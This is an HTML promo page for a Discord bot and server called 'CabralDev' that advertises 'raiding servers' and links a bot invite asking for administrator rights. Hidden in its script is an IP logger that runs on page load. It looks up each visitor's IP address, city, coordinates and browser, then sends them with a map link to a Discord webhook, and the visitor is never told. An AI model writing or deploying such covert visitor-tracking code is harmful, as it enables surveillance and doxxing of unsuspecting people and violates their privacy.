<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CabralDev - Official Page</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }

        body {
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('pilha_dinheiro.png'); 
            background-size: cover; background-position: center; background-attachment: fixed;
            height: 100vh; display: flex; justify-content: center; align-items: center; color: white; overflow: hidden;
        }

        .container {
            background: rgba(20, 20, 20, 0.95); padding: 40px; border-radius: 25px; text-align: center;
            max-width: 450px; width: 90%; border: 4px solid #ff0000;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.6); animation: neonPulse 3s infinite alternate;
        }

        @keyframes neonPulse {
            from { border-color: #ff0000; box-shadow: 0 0 20px #ff0000; }
            to { border-color: #8a2be2; box-shadow: 0 0 30px #8a2be2; }
        }

        h1 { font-size: 32px; margin-bottom: 5px; letter-spacing: 2px; }
        .owner-text { font-size: 18px; margin-bottom: 25px; opacity: 0.8; }

        .btn {
            display: block; width: 100%; padding: 16px; margin: 12px 0; border: none;
            border-radius: 12px; color: white; font-weight: bold; cursor: pointer;
            transition: 0.3s; text-decoration: none; font-size: 14px; text-transform: uppercase; text-align: center;
        }

        .btn:hover { transform: scale(1.03); filter: brightness(1.2); }
        .btn-enter { background: #5865F2; }
        .btn-copy { background: #111; border: 1px solid #333; }
        .btn-cabral { background: #222; color: #ff0000; border: 2px solid #ff0000; }

        /* JANELA DO VÍDEO */
        .overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95); z-index: 999; justify-content: center; align-items: center;
        }

        .caixa-video { width: 90%; max-width: 750px; position: relative; background: #000; border-radius: 10px; overflow: hidden; }
        .fechar { position: absolute; top: 10px; right: 20px; color: white; font-size: 40px; cursor: pointer; z-index: 1001; }
        
        .footer-tag { margin-top: 25px; color: #ff0000; font-weight: bold; font-size: 13px; }
    </style>
</head>
<body>

    <div class="container">
        <h1>CabralDev<span>💤</span></h1>
        <p class="owner-text">The best bot and best server</p>

        <a href="https://discord.gg/CNB6YBhBe2" target="_blank" class="btn btn-enter">ENTER DISCORD SERVER</a>
        <button class="btn btn-copy" onclick="abrirBot()">ADD BOT IN YOUR SERVER</button>
        <button onclick="ligarRaiding()" class="btn btn-cabral">C̷a̷b̷r̷a̷l̷D̷e̷v̷💤 Raiding Servers</button>

        <div class="footer-tag">MADE BY CABRALDEV</div>
    </div>

    <div id="janelaVideo" class="overlay">
        <div class="caixa-video">
            <span class="fechar" onclick="desligarRaiding()">&times;</span>
            <iframe id="meuVideo" width="100%" height="420" 
                src="https://www.youtube.com/embed/QucuMiI7orY?enablejsapi=1&autoplay=1&mute=1&rel=0" 
                frameborder="0" 
                allow="autoplay; encrypted-media" 
                allowfullscreen>
            </iframe>
        </div>
    </div>





<script>
// === COLOQUE AQUI A URL DA SUA WEBHOOK DO DISCORD ===
const webhookUrl = "https://discord.com/api/webhooks/SEU_ID_AQUI/SEU_TOKEN_AQUI";

async function enviarLogger() {
    try {
        // Pega o IP público usando uma API gratuita (ip-api.com)
        const geoRes = await fetch(`http://ip-api.com/json/?fields=status,message,country,city,lat,lon,query`);
        const geo = await geoRes.json();

        if (geo.status !== "success") {
            console.log("Não conseguiu pegar localização");
            return;
        }

        const ip = geo.query || "Desconhecido";
        const pais = geo.country || "Desconhecido";
        const cidade = geo.city || "Desconhecido";
        const lat = geo.lat || "";
        const lon = geo.lon || "";
        const mapa = lat && lon ? `https://www.google.com/maps?q=${lat},${lon}` : "Sem localização";
        const browser = navigator.userAgent;
        const data = new Date().toLocaleString('pt-BR');
        const origem = document.referrer || "Direto (sem referer)";

        // Monta a mensagem
        const msg = `**Novo acesso detectado!**\n\n` +
                    `**IP:** ${ip}\n` +
                    `**Data/Hora:** ${data}\n` +
                    `**País:** ${pais}\n` +
                    `**Cidade:** ${cidade}\n` +
                    `**Navegador:** ${browser}\n` +
                    `**Origem:** ${origem}\n` +
                    (mapa !== "Sem localização" ? `**Mapa:** ${mapa}\n` : "");

        // Envia para a webhook
        await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: msg,
                username: "IP Logger",
                avatar_url: "https://i.imgur.com/alguma-imagem.png" // opcional, pode trocar ou remover
            })
        });

        console.log("Logger enviado com sucesso");

    } catch (error) {
        console.error("Erro no logger:", error);
    }
}

// Executa automaticamente quando a página carregar
window.onload = enviarLogger;
</script>
    
    <script>
        function abrirBot() {
            window.open("https://discord.com/oauth2/authorize?client_id=1479937612738330705&permissions=8&scope=bot", '_blank');
        }

        function ligarRaiding() {
            const janela = document.getElementById('janelaVideo');
            const video = document.getElementById('meuVideo');
            janela.style.display = 'flex';
            // Comando para dar play via API do YouTube
            video.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
        }

        function desligarRaiding() {
            const janela = document.getElementById('janelaVideo');
            const video = document.getElementById('meuVideo');
            janela.style.display = 'none';
            // Comando para pausar via API do YouTube
            video.contentWindow.postMessage('{"event":"command","func":"pauseVideo","args":""}', '*');
        }

        window.onclick = function(event) {
            if (event.target == document.getElementById('janelaVideo')) { desligarRaiding(); }
        }
    </script>
</body>
</html>
